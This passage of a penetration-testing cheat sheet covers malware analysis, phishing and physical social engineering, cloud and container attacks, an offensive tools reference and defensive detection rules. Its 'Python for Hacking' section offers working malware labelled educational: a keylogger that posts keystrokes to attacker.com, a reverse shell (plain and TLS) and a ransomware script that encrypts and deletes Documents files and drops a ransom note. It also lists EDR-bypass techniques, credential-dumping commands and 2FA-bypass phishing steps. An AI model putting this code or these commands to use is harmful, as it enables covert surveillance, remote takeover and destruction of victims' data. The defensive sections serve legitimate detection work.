# Entropy check (high = packed)
python3 -c "
import sys
from collections import Counter
with open(sys.argv[1], 'rb') as f:
    data = f.read()
    entropy = -sum((c/len(data)) * (c/len(data)).bit_length() for c in Counter(data).values())
    print(f'Entropy: {entropy:.4f}')
" malware.exe

# PE analysis for suspicious imports
python3 -c "
import pefile
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    for imp in entry.imports:
        print(f'{entry.dll.decode()} -> {imp.name.decode() if imp.name else \"ordinal\"}')
"

**Suspicious API Calls:**
- VirtualAlloc, VirtualProtect — Memory allocation
- CreateRemoteThread — Process injection
- WriteProcessMemory — Process injection
- CreateProcess — Process creation
- RegOpenKeyEx, RegSetValueEx — Persistence
- URLDownloadToFile — Network download
- Socket, connect, send — Network communication
- CryptAcquireContext, CryptEncrypt — Encryption
- GetAsyncKeyState — Keylogging
- FindFirstFile, FindNextFile — File enumeration

### 8.2 Dynamic Analysis (Sandboxing)

**Setup:**
- REMnux (Linux analysis VM)
- Flare VM (Windows analysis VM)
- Cuckoo Sandbox (automated)
- INetSim (fake network services)

**Process Monitoring:**
# Linux
strace -f -o strace.log ./malware.elf
strace -f -e trace=open,openat,read,write,socket,connect ./malware.elf
ltrace -f -o ltrace.log ./malware.elf
lsof -p PID

# Windows
# Process Monitor (procmon) — Registry, File, Network, Process
# Process Explorer — DLLs, strings in memory
# API Monitor — Hooked API calls
# TCPView — Network connections
# Regshot — Registry comparison snapshots

**Fake Network (INetSim):**
inetsim
# All DNS resolves to localhost
# Captures all sent data
ls /var/log/inetsim/http/

**Dynamic Analysis Checklist:**
1. Network: DNS queries, HTTP requests, C2 beaconing, data exfiltration
2. File System: Created/modified/deleted files
3. Registry (Windows): Run keys, services, file associations
4. Process: Child processes, process injection, DLL loading
5. Memory: Injected code, decrypted strings, config data, C2 domains

### 8.3 Memory Forensics (Volatility)

**Volatility 3:**
python3 vol.py -f memory.dmp windows.info
python3 vol.py -f memory.dmp windows.pslist
python3 vol.py -f memory.dmp windows.psscan  # Hidden processes
python3 vol.py -f memory.dmp windows.pstree
python3 vol.py -f memory.dmp windows.netscan
python3 vol.py -f memory.dmp windows.dlllist --pid 1234
python3 vol.py -f memory.dmp windows.malfind --pid 1234  # Injected code
python3 vol.py -f memory.dmp windows.cmdline
python3 vol.py -f memory.dmp windows.handles --pid 1234
python3 vol.py -f memory.dmp windows.registry.hiveslist
python3 vol.py -f memory.dmp windows.registry.printkey

# Linux memory
python3 vol.py -f mem.dmp linux.pslist
python3 vol.py -f mem.dmp linux.bash
python3 vol.py -f mem.dmp linux.netstat

### 8.4 Network Signature Analysis

# PCAP analysis (Wireshark/tcpdump)
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "tcp.port==4444" -x  # Hex dump of C2 traffic

# Extract objects from HTTP streams
tshark -r capture.pcap --export-objects "http,/tmp/extracted"

# Suricata signature matching
suricata -r capture.pcap -S /etc/suricata/rules/

### 8.5 YARA Rules

rule SuspiciousStrings {
    meta:
        description = "Detects suspicious patterns"
    strings:
        $s1 = "CreateRemoteThread" nocase
        $s2 = "VirtualAllocEx" nocase
        $s3 = "WriteProcessMemory" nocase
        $s4 = "URLDownloadToFile" nocase
        $s5 = "cmd.exe" nocase
        $s6 = "powershell -enc" nocase
    condition:
        3 of them
}

### 8.6 Ransomware Analysis

# Common patterns:
- File encryption (AES + RSA hybrid)
- Ransom note dropped (README.txt, HOW_TO_DECRYPT.html)
- Extension changed (.encrypted, .locked, .crypted)
- Shadow copies deleted (vssadmin.exe Delete Shadows)
- Volume Shadow Copy Service disabled
- Boot configuration modified (bcdedit)
- Mutex created to prevent multiple infections

# Detection:
strings ransomware.exe | grep -i "aes\|rsa\|encrypt\|decrypt\|bitcoin\|monero\|tor\|onion"
# Check for known ransomware signatures on VirusTotal



---

## 9. Social Engineering

### 9.1 Phishing

**Types:**
- Spear phishing — Targeted at specific individual
- Whaling — Targeting executives/C-suite
- Vishing — Voice phishing (phone calls)
- Smishing — SMS phishing (text messages)
- Clone phishing — Legitimate email with malicious attachment
- Watering hole — Compromise frequently visited site

**Phishing Toolkit:**
# Social Engineering Toolkit (SET)
setoolkit
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
4) Site Cloner

# GoPhish — Open source phishing framework
# EvilGinx — nginx reverse proxy for phishing + 2FA bypass
# Modlishka — Reverse proxy with 2FA token capture

**Phishing Email Analysis:**
# View full headers
# Check SPF, DKIM, DMARC records
dig txt _spf.google.com
# Check Return-Path vs From
# Check for URL obfuscation
# Check for spoofed sender address

**2FA Bypass via Reverse Proxy:**
# EvilGinx captures both credentials and 2FA token in real-time
git clone https://github.com/kgretzky/evilginx2
./evilginx -p phishing-domain.com

### 9.2 OSINT (Open Source Intelligence)

**Tools:**
theHarvester -d example.com -b google,linkedin,bing
recon-ng
maltego  # GUI-based OSINT (commercial)
sherlock username  # Find username across social networks
holehe victim@example.com  # Check email on services
social-analyzer  # Social media analysis
twint  # Twitter OSINT (no API needed)

**OSINT Framework:**
https://osintframework.com/  # Visual tree of tools

**Email OSINT:**
h8mail -t victim@example.com -bc /path/to/breaches
smtp-user-enum -M VRFY -U users.txt -t mail.example.com

**Geolocation OSINT:**
- EXIF data from photos (exiftool photo.jpg)
- Google Maps/Street View
- Reverse image search (Google Images, TinEye)
- Social media check-ins/location tags

**People OSINT:**
- Pipl, Spokeo, Whitepages
- LinkedIn, Facebook, Instagram
- BeenVerified
- FamilyTreeNow

### 9.3 Physical Security Assessment

**Techniques:**
- Tailgating/Piggybacking — Follow authorized person through door
- Badge cloning — Clone RFID badges (Proxmark3)
- Lock picking — Physical lock manipulation
- Shoulder surfing — Observing screen/keyboard over shoulder
- Dumpster diving — Searching trash for sensitive documents
- Social engineering calls — Pretending to be IT support
- Pretexting — Creating fabricated scenario

**Lock Picking Tools:**
- Tension wrench + picks (rake, hook, diamond)
- Electric pick guns
- Bump keys
- Bypass tools (shims, jiggler keys)

### 9.4 Badge Cloning

# Clone RFID badges with Proxmark3
lf search  # Find card type
lf em 4102 read  # Read EM4102
lf em 4102 write --id CARD_ID  # Write blank card

# HID ProxCard II cloning
lf hid fchk  # Find HID format
lf hid sim --fc FACILITY --cn CARD



---

## 10. Cloud Security

### 10.1 AWS Security

**S3 Bucket Enumeration:**
# Check for public buckets
aws s3 ls s3://bucket-name --no-sign-request
curl http://bucket-name.s3.amazonaws.com/
curl http://s3.amazonaws.com/bucket-name/

# Bucket brute force
s3scanner -bucket-list buckets.txt

**IAM Privilege Escalation:**
# Misconfigured IAM policies
aws iam list-attached-user-policies --user-name victim
aws iam list-user-policies --user-name victim
# Key IAM actions: iam:CreateUser, iam:CreateAccessKey, iam:PutUserPolicy
# iam:PassRole + ec2:RunInstances = privilege escalation

**AWS Metadata SSRF:**
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

**Lambda Security:**
# Check for hardcoded secrets in Lambda env vars
aws lambda get-function --function-name my-function
aws lambda get-function-configuration --function-name my-function

**Tools:**
- ScoutSuite — Cloud security auditing
- Pacu — AWS exploitation framework
- Cloudsplaining — IAM policy analysis
- CloudTrail — API call logging

### 10.2 Azure Security

**Azure Enumeration:**
# Already authenticated
az account show
az vm list
az storage account list
az role assignment list --assignee user@domain.com

**Azure Metadata:**
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"

**Azure Key Vault:**
az keyvault list
az keyvault secret list --vault-name vault-name

**Tools:**
- Stormspotter — Azure attack surface mapper
- ROADtools — Azure AD enumeration
- MicroBurst — Azure exploitation

### 10.3 GCP Security

**GCP Metadata:**
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

**GCP Enumeration:**
gcloud projects list
gcloud compute instances list
gcloud iam service-accounts list
gsutil ls gs://bucket-name

**Tools:**
- GCPBucketBrute — Bucket enumeration
- GCPwn — GCP exploitation framework

### 10.4 Container Security

**Docker Security:**
# Privileged container escape
docker run --privileged -it ubuntu bash
# Inside container:
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Docker socket abuse
# If /var/run/docker.sock is mounted inside container
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu bash

# Container image scanning
trivy image nginx:latest
grype nginx:latest

**Kubernetes Security:**
# RBAC enumeration
kubectl auth can-i --list
kubectl get secrets
kubectl get pods --all-namespaces
kubectl get services --all-namespaces

# Kubernetes API server exposed
curl -k https://k8s-api-server:6443/api/v1/pods

# Etcd data access (contains all cluster secrets)
# If etcd is exposed or accessible from compromised pod

**Tools:**
- kube-bench — CIS benchmark checker
- kube-hunter — Kubernetes security scanner
- Peirates — Kubernetes penetration testing

### 10.5 Serverless Security

# Event injection
# SSRF from Lambda functions
# Insecure dependencies bundled with functions
# Environment variable leakage
# Excessive IAM roles for functions
# Function event data injection



---

## 11. Tools Reference

### 11.1 Reconnaissance Tools

**Nmap — Network Mapper**
What: Port scanning, service detection, OS fingerprinting, scriptable
Syntax: nmap [options] target
Key Options: -sS (SYN scan), -sT (TCP), -sU (UDP), -sV (version), -O (OS), -A (aggressive), -p- (all ports), --script (NSE scripts)
Common: nmap -sV -sC -O target, nmap -p- target, nmap --script vuln target

**Masscan — Mass IP Scanner**
What: Fastest port scanner (can scan entire internet)
Syntax: masscan -p80 0.0.0.0/0 --rate=10000
Key Options: -p (ports), --rate (packets/sec), --banners (grab banners)

**Netcat — Swiss Army Knife**
What: Read/write TCP/UDP connections, port scanning, file transfer, backdoors
Syntax: nc [options] host port
Common: nc -lvnp 4444 (listen), nc -nv target 22 (connect), nc -e /bin/bash (bind shell)

**Ncat — Nmap's Netcat**
What: Enhanced netcat with SSL, proxy, brokering
Syntax: ncat --ssl -lvnp 4444
Key Options: --ssl (SSL/TLS), --proxy (proxy through), --broker (multi-connection), --chat (group chat)

**Wireshark — Network Protocol Analyzer**
What: Deep packet inspection, protocol dissection, traffic capture
Syntax: GUI or tshark -r capture.pcap -Y "http.request"
Key Features: Follow streams, display filters, protocol hierarchies, IO graphs

**tcpdump — Command Line Packet Capture**
What: Lightweight packet capture
Syntax: tcpdump -i eth0 -w capture.pcap
Key Options: -i (interface), -w (write), -r (read), -n (no DNS), port/host (filters)
Common: tcpdump -i eth0 port 80 or port 443, tcpdump -i eth0 host 192.168.1.100

### 11.2 Exploitation Tools

**Metasploit Framework**
What: Exploitation framework with modules for every stage of attack
Syntax: msfconsole, msfvenom
Common: search exploit, use exploit/multi/handler, set payload, run
Key Payloads: meterpreter (versatile), shell, beacon

**Empire — PowerShell Empire**
What: Post-exploitation agent framework (PowerShell agents)
Syntax: powershell-empire server, powershell-empire client
Key Features: PowerShell-based agents, reflective loading, AMSI bypass
Common: uselistener http, usestager windows_launcher_bat, set Listener http, execute

**Cobalt Strike**
What: Commercial C2 framework (post-exploitation / adversary simulation)
Key Features: Beacon (C2 agent), Malleable C2 (traffic customization), Pivot listeners, Artifact kit
Note: This is a commercial tool, often used by red teams

### 11.3 Web Application Tools

**Burp Suite**
What: Web application security testing proxy
Key Features: Intercepting proxy, Repeater, Intruder, Scanner (pro), Decoder, Comparer, Extender
Common: Proxy tab intercept traffic, Repeater modify requests, Intruder brute force/fuzzing, Extensions (Autorize, Turbo Intruder)

**OWASP ZAP**
What: Open source web app scanner
Syntax: zap.sh, zap-cli quick-scan http://example.com
Key Features: Automated scanner, Active/passive scanning, HUD (head-up display), API, Fuzzer
Common: zap-cli active-scan http://example.com, HUD mode for manual testing

### 11.4 Password Cracking Tools

**John the Ripper**
What: Offline password cracking
Syntax: john --wordlist=rockyou.txt hash.txt
Key Options: --rules (word mangling), --incremental (brute force), --show (show cracked)
Formats: john --list=formats
Common: unshadow /etc/passwd /etc/shadow > hash.txt, john hash.txt

**Hashcat — GPU Accelerated Cracker**
What: Fastest password cracker (GPU accelerated)
Syntax: hashcat -m MODE -a 0 hash.txt wordlist.txt
Modes: -m 0 (MD5), -m 1000 (NTLM), -m 2500 (WPA2), -m 100 (SHA1), -m 3200 (bcrypt)
Attack Modes: -a 0 (dictionary), -a 3 (mask/brute), -a 6 (hybrid dict+mask), -a 7 (hybrid mask+dict)
Rules: -r best64.rule, -r OneRuleToRuleThemAll.rule
Common: hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule --force

### 11.5 Web Fuzzing Tools

**SQLmap — SQL Injection Automation**
What: Automated SQL injection detection and exploitation
Syntax: sqlmap -u URL --dbs --dump
Key Options: --os-shell (get shell), --dbs (databases), -D/T (database/table), --tamper (WAF bypass)

**Gobuster — Directory/File Brute Force**
What: Directory, DNS, and virtual host brute forcing
Syntax: gobuster dir -u http://example.com -w wordlist.txt
Key Options: dir (directories), dns (subdomains), vhost (virtual hosts), -x (extensions)
Common: gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

**Dirb — Web Content Scanner**
What: Directory brute force (similar to gobuster)
Syntax: dirb http://example.com /usr/share/wordlists/dirb/common.txt

**FFUF — Fuzz Faster U Fool**
What: Fast web fuzzer, highly customizable
Syntax: ffuf -u http://example.com/FUZZ -w wordlist.txt
Key Options: -u (URL with FUZZ keyword), -w (wordlist), -H (headers), -fc (filter status), -fs (filter size)
Common: ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 4242, ffuf -u https://example.com/api/v1/FUZZ -w apis.txt

### 11.6 Wireless Tools

**Aircrack-ng Suite**
Components: aircrack-ng (cracker), airmon-ng (monitor mode), airodump-ng (capture), aireplay-ng (injection), airdecap-ng (decrypt), airserv-ng (server)
What: Complete WEP/WPA/WPA2 cracking suite

**Kismet — Wireless IDS/Scanner**
What: Passive wireless network detector, sniffer, IDS
Syntax: kismet -c wlan0mon

**Reaver — WPS Cracking**
What: WPS PIN brute force
Syntax: reaver -i wlan0mon -b BSSID -vv

### 11.7 MITM Tools

**Bettercap — Swiss Army Knife for MITM**
What: Modular MITM framework with ARP, DNS, HTTP, HTTPS, BLE, WiFi
Syntax: bettercap -iface eth0
Caplets: arp.spoof, net.sniff, dns.spoof, https.proxy (with sslstrip), wifi.ap, ble.recon

**Ettercap — Traditional MITM Tool**
What: ARP poisoning based MITM with plugin support
Syntax: ettercap -T -M arp:remote /target// /gateway//
Plugins: dns_spoof, autoadd, search_promisc

**Responder — LLMNR/NBT-NS/mDNS Poisoner**
What: Poison name resolution protocols to capture credentials
Syntax: responder -I eth0 -rdw
Key Options: -I (interface), -r (enable answers), -d (DHCP), -w (WPAD proxy)

### 11.8 Credential Tools

**Hydra — Network Login Cracker**
What: Fast online brute force (many protocols)
Syntax: hydra -l user -P pass.txt ssh://target
Protocols: ssh, http-get, http-post, ftp, smb, mysql, rdp, pop3, smtp, vnc, telnet

**Medusa — Parallel Brute Forcer**
What: Similar to Hydra, modular design
Syntax: medusa -h target -u user -P pass.txt -M ssh

**Mimikatz — Windows Credential Dumper**
What: Extract plaintext passwords, hashes, PINs, Kerberos tickets from memory
Syntax: mimikatz.exe
Common: sekurlsa::logonpasswords, lsadump::sam, lsadump::dcsync, kerberos::golden, sekurlsa::pth

### 11.9 Active Directory Tools

**BloodHound — AD Attack Path Mapper**
What: Graph-based AD relationship analyzer
Components: SharpHound (collector), BloodHound GUI (analytics)
Common: SharpHound.exe -c All, then import JSON into BloodHound UI
Queries: Find all Domain Admins, Shortest paths to DA, Kerberoastable users, AS-REP roastable users

**PowerView — PowerShell AD Enumeration**
What: AD reconnaissance PowerShell module
Common: Get-NetUser, Get-NetComputer, Get-NetGroup, Find-LocalAdminAccess, Invoke-Kerberoast

**Impacket — Python AD Tools**
What: Collection of Python scripts for AD protocol exploitation
Key Scripts: secretsdump.py (extract hashes), wmiexec.py (WMI exec), psexec.py (PsExec), smbexec.py (SMB exec), ticketConverter.py, getTGT.py, getST.py, raiseChild.py

### 11.10 C2 Frameworks

**C2 Framework Comparison:**
- Metasploit — Versatile, good for initial access
- Empire — PowerShell-focused, good post-exploitation
- Cobalt Strike — Commercial, most features (Beacon, Malleable C2)
- Covenant — Open source C# C2
- Sliver — Open source, modern (Go-based)
- Havoc — Modern C2 with GUI
- Mythic — Plugin-based C2 framework
- PoshC2 — Python + PowerShell C2
- DeimosC2 — .NET C2 with Telegram bot

**Beacon (Cobalt Strike) Features:**
- HTTP/HTTPS/DNS/SMB listeners
- Execute-assembly (run .NET in memory)
- User Define Reflective Loader (UDRL)
- Process injection techniques
- Pivoting (SOCKS proxy, port forwarding)
- Malleable C2 profiles (customize traffic)
- Artifact kit (customize payloads)



---

## 12. Python for Hacking

### 12.1 Socket Programming

**Simple TCP Client:**
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('example.com', 80))
s.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
response = s.recv(4096)
print(response.decode())
s.close()
```

**Simple TCP Server:**
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(5)
print('Listening on 0.0.0.0:4444')

while True:
    client, addr = s.accept()
    print(f'Connection from {addr}')
    client.send(b'Welcome!\n')
    data = client.recv(1024)
    print(f'Received: {data}')
    client.close()
```

**Banner Grabber:**
```python
import socket

def grab_banner(host, port):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))
        banner = s.recv(1024).decode().strip()
        return banner
    except:
        return None
    finally:
        s.close()

print(grab_banner('192.168.1.100', 22))
```

### 12.2 Scapy for Packet Crafting

```python
from scapy.all import *

# ICMP ping
pkt = IP(dst='192.168.1.1')/ICMP()
reply = sr1(pkt, timeout=2)
if reply:
    print(f'Host is up: {reply.src}')

# TCP SYN scan
pkt = IP(dst='192.168.1.100')/TCP(dport=80, flags='S')
reply = sr1(pkt, timeout=2)
if reply and reply.haslayer(TCP):
    if reply[TCP].flags == 0x12:  # SYN-ACK
        print('Port 80 is open')
        # Send RST
        send(IP(dst='192.168.1.100')/TCP(dport=80, flags='R'))

# ARP request
arp = ARP(pdst='192.168.1.0/24')
ans, unans = sr(arp, timeout=2)
for sent, recv in ans:
    print(f'{recv.psrc} - {recv.hwsrc}')

# DNS query
pkt = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='example.com'))
reply = sr1(pkt, timeout=2)
if reply and reply.haslayer(DNS):
    for ans in reply[DNS].an:
        print(f'{ans.rrname.decode()} -> {ans.rdata}')

# HTTP packet crafting
pkt = IP(dst='example.com')/TCP(dport=80, flags='PA')/Raw(load=b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
```

### 12.3 Building a Port Scanner

```python
import socket
import threading
from queue import Queue

target = '192.168.1.100'
q = Queue()
open_ports = []

def scan_port(port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((target, port))
        open_ports.append(port)
        print(f'Port {port} is open')
    except:
        pass
    finally:
        s.close()

def worker():
    while not q.empty():
        port = q.get()
        scan_port(port)
        q.task_done()

# Fill queue with ports
for port in range(1, 1024):
    q.put(port)

# Create thread pool
threads = []
for _ in range(50):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

q.join()
print(f'Open ports: {open_ports}')
```

### 12.4 Building a Keylogger (Educational)

```python
import keyboard
import requests
import threading
import time

log_file = 'keystrokes.log'
buffer = []
send_interval = 60  # seconds

def on_key(event):
    key = event.name
    if key == 'space':
        key = ' '
    elif key == 'enter':
        key = '\n'
    elif len(key) > 1:
        key = f'[{key}]'
    buffer.append(key)
    
    with open(log_file, 'a') as f:
        f.write(key)

def send_logs():
    while True:
        time.sleep(send_interval)
        if buffer:
            data = ''.join(buffer)
            try:
                requests.post('http://attacker.com/log', data={'data': data})
            except:
                pass
            buffer.clear()

keyboard.on_press(on_key)
sender = threading.Thread(target=send_logs, daemon=True)
sender.start()
keyboard.wait()
```

### 12.5 Building a Reverse Shell (Educational)

```python
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.0.0.1', 4444))
    
    while True:
        cmd = s.recv(1024).decode().strip()
        if cmd.lower() == 'exit':
            break
        elif cmd.startswith('cd '):
            try:
                os.chdir(cmd[3:])
                result = ''
            except Exception as e:
                result = str(e)
        else:
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            except Exception as e:
                result = str(e)
        s.send(result.encode() + b'\n')
    s.close()

# Encrypted version with TLS
import ssl

def encrypted_reverse_shell():
    sock = socket.socket()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    s = context.wrap_socket(sock, server_hostname='10.0.0.1')
    s.connect(('10.0.0.1', 4444))
    # ... same as above
```

### 12.6 Building a Simple Ransomware Simulation (Educational)

```python
import os
from cryptography.fernet import Fernet
import glob

# GENERATE KEY (would be sent to attacker server in real ransomware)
key = Fernet.generate_key()
cipher = Fernet(key)

# Save key (in real ransomware, this is sent to C2)
with open('key.txt', 'wb') as f:
    f.write(key)

# Target file extensions
extensions = ['*.txt', '*.docx', '*.xlsx', '*.pdf', '*.jpg', '*.png']

def encrypt_file(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    encrypted = cipher.encrypt(data)
    with open(filepath + '.encrypted', 'wb') as f:
        f.write(encrypted)
    os.remove(filepath)
    print(f'Encrypted: {filepath}')

# Encrypt files in Documents
for ext in extensions:
    for filepath in glob.glob(os.path.expanduser(f'~/Documents/{ext}')):
        encrypt_file(filepath)

# Ransom note
note = f'''
YOUR FILES HAVE BEEN ENCRYPTED
To recover your files, send 0.1 BTC to wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Then email your personal ID to: decrypt@protonmail.com
Your personal ID: {os.urandom(8).hex()}
'''
with open(os.path.expanduser('~/Desktop/README.txt'), 'w') as f:
    f.write(note)
```

### 12.7 Phishing Page Detector

```python
import requests
from urllib.parse import urlparse
import re

def check_phishing(url):
    score = 0
    reasons = []
    
    # 1. Check for IP address instead of domain
    parsed = urlparse(url)
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', parsed.netloc.split(':')[0]):
        score += 2
        reasons.append('Uses IP address instead of domain')
    
    # 2. Check for suspicious TLDs
    suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', '.club']
    if any(tld in parsed.netloc for tld in suspicious_tlds):
        score += 1
        reasons.append(f'Suspicious TLD: {parsed.netloc}')
    
    # 3. Check for @ symbol in URL
    if '@' in url:
        score += 2
        reasons.append('Contains @ symbol')
    
    # 4. Check for HTTPS with bad cert
    if url.startswith('https://'):
        try:
            r = requests.get(url, verify=True, timeout=5)
        except:
            score += 1
            reasons.append('SSL certificate issue')
    
    # 5. Check for excessive subdomains
    subdomains = parsed.netloc.split('.')
    if len(subdomains) > 4:
        score += 1
        reasons.append('Excessive subdomains')
    
    # 6. Check URL length
    if len(url) > 100:
        score += 1
        reasons.append('Unusually long URL')
    
    verdict = 'PHISHING' if score >= 3 else 'SUSPICIOUS' if score >= 1 else 'SAFE'
    return {'url': url, 'verdict': verdict, 'score': score, 'reasons': reasons}

# Example
result = check_phishing('http://192.168.1.100/login@bank-secure.tk/login.php')
print(result)
```



---

## 13. Defensive Security

### 13.1 SIEM (Security Information and Event Management)

**Splunk:**
# Search commands
index=main sourcetype=WinEventLog:Security EventID=4625  # Failed logins
index=main sourcetype=linux_secure "Failed password"      # SSH failures
index=main sourcetype=WinEventLog:Security EventID=4688  # Process creation
index=main sourcetype=WinEventLog:Security EventID=4624  # Successful logins

# Correlation search: multiple failed logins followed by success = brute force
index=main sourcetype=WinEventLog:Security (EventID=4625 OR EventID=4624)
| stats count(eval(EventID=4625)) as failures, count(eval(EventID=4624)) as successes by Account_Name, src_ip
| where failures > 5 AND successes > 0

# Detection: suspicious process execution
index=main sourcetype=WinEventLog:Security EventID=4688
| search New_Process_Name IN ("*powershell*", "*cmd.exe*", "*wscript.exe*", "*cscript.exe*", "*rundll32.exe*", "*regsvr32.exe*")
| stats count by New_Process_Name, Parent_Process_Name

# Detection: log clearing
index=main sourcetype=WinEventLog:Security EventID=1102  # Security log cleared

**ELK Stack (Elasticsearch, Logstash, Kibana):**
# Elasticsearch queries
GET /security-logs-*/_search
{
  "query": {
    "bool": {
      "filter": [
        {"term": {"event_id": "4625"}}
      ],
      "must_not": [
        {"term": {"user.name": "SYSTEM"}}
      ]
    }
  }
}

# Kibana detection rules
# Failed authentication threshold
event.action: "failed-login" AND event.outcome: "failure"
| stats count by source.ip, user.name | where count > 10

# PowerShell abuse detection
process.name: "powershell.exe" AND process.args: "*-enc*"

### 13.2 IDS/IPS (Intrusion Detection/Prevention)

**Snort — Network IDS/IPS:**
```bash
# Snort rules format: action proto src_ip src_port direction dst_ip dst_port msg; sid;
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"HTTP Request"; content:"GET"; nocase; sid:1000001;)

# Rule examples:
# SQL Injection detection
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQLi detected"; flow:to_server,established; content:"' OR 1=1"; nocase; sid:1000002;)

# XSS detection
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"XSS detected"; flow:to_server,established; content:"<script>"; nocase; sid:1000003;)

# Port scan detection
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Port scan detected"; flags:S; threshold:type both, track by_src, count 20, seconds 10; sid:1000004;)

# Run Snort
snort -i eth0 -c /etc/snort/snort.conf -l /var/log/snort/
snort -r capture.pcap -c /etc/snort/snort.conf -l /var/log/snort/
```

**Suricata — Modern IDS/IPS/Network Security Monitoring:**
```bash
# Suricata can use Snort rules
suricata -i eth0 -c /etc/suricata/suricata.yaml
suricata -r capture.pcap -c /etc/suricata/suricata.yaml

# Eve.json log format (JSON — easy to ingest into SIEM)
```

### 13.3 Firewall Rules & Hardening

**iptables (Linux):**
```bash
# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH (rate limited)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow specific services
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Block port scans
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

**Windows Firewall (PowerShell):**
```powershell
# Block inbound on specific port
New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block

# Allow only specific IPs to RDP
New-NetFirewallRule -DisplayName "RDP from admin" -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 192.168.1.0/24 -Action Allow

# Log blocked connections
Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked $true
Set-NetFirewallProfile -Profile Domain,Public,Private -LogFileName C:\Windows\System32\LogFiles\Firewall\pfirewall.log
```

### 13.4 EDR Evasion (Defensive Perspective)

**Common EDR Products:**
- CrowdStrike Falcon
- Microsoft Defender for Endpoint
- SentinelOne
- Carbon Black (VMware)
- Cylance (BlackBerry)
- Palo Alto Cortex XDR

**EDR Detection Techniques (What EDRs look for):**
- Process injection (CreateRemoteThread, NtCreateThreadEx)
- Unmanaged DLL loading (LoadLibrary from unusual locations)
- Suspicious parent-child relationships (word.exe -> powershell.exe)
- Network connections from script interpreters
- Abnormal LSASS access (NtOpenProcess on lsass.exe)
- Windows event log anomalies
- AMSI (Anti-Malware Scan Interface) triggers
- ETW (Event Tracing for Windows) events
- Remote thread creation
- API call sequences

**EDR Bypass Techniques (Defensive knowledge):**
- Direct syscalls (avoiding userland hooks)
- DLL unhooking (restoring original ntdll.dll)
- Phantom DLL hijacking (loading from unmonitored paths)
- ETW patching (disable ETW for current process)
- AMSI patching (disable AMSI checks)
- Parent PID spoofing (make process look legitimate)
- Alternate PowerShell hosts (run PowerShell from unmonitored binary)
- Reflective DLL loading (avoid CreateRemoteThread)
- Process hollowing (replace legitimate process memory)
- Indirect syscalls (via hardware breakpoints)
- Golang/ Nim/ Rust payloads (cross-compiled, harder to signature)

### 13.5 Incident Response Playbook

**Phase 1: Preparation**
- Inventory assets, establish baselines
- Create IR team, define roles
- Documentation, communication plan
- Tools ready: forensic images, analysis VMs, SIEMs

**Phase 2: Detection & Analysis**
- Alert triage: Is this real? Scope? Severity?
- Collect evidence: memory capture, disk image, network logs
- Analyze: timeline, artifacts, IOCs
- Determine root cause

**Phase 3: Containment**
- Isolate affected systems (network segmentation)
- Disable compromised accounts
- Block C2 traffic (firewall, DNS sinkhole)
- Preserve evidence before cleanup

**Phase 4: Eradication**
- Remove malware
- Patch vulnerabilities
- Reset compromised credentials
- Rebuild compromised systems from known-good image

**Phase 5: Recovery**
- Restore from clean backups
- Monitor for re-infection
- Gradual return to normal operations
- Validate systems are clean

